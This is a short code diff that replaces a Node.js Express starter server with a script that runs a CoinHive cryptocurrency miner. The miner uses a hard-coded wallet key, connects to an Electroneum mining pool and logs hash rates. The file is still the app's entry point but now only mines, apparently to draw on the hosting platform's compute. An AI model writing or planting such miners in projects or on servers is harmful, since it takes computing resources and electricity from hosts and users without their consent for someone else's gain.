@@ -1,10 +1,26 @@
-const express = require('express')
-const path = require('path')
-const PORT = process.env.PORT || 5000
+const CoinHive = require('coin-hive');
 
-express()
-  .use(express.static(path.join(__dirname, 'public')))
-  .set('views', path.join(__dirname, 'views'))
-  .set('view engine', 'ejs')
-  .get('/', (req, res) => res.render('pages/index'))
-  .listen(PORT, () => console.log(`Listening on ${ PORT }`))
+(async () => {
+
+  // Create miner
+  const miner = await CoinHive('etnkNnVdfUc8h6GqKcTQxi2a7Y42MVXSeguLo7zoMqJmRjy7gTFiG4dM6X44tiGfGhbnBEriH3WRSBZwBp7asaw89fQeBdGJqv', {
+    pool: {
+      host: 'pool.electroneum.space',
+      port: 1111,
+      pass: 'x' // default 'x' if not provided 
+    }
+  });
+
+  // Start miner
+  await miner.start();
+
+  // Listen on events
+  miner.on('found', () => console.log('Found!'))
+  miner.on('accepted', () => console.log('Accepted!'))
+  miner.on('update', data => console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `));
+
+})();
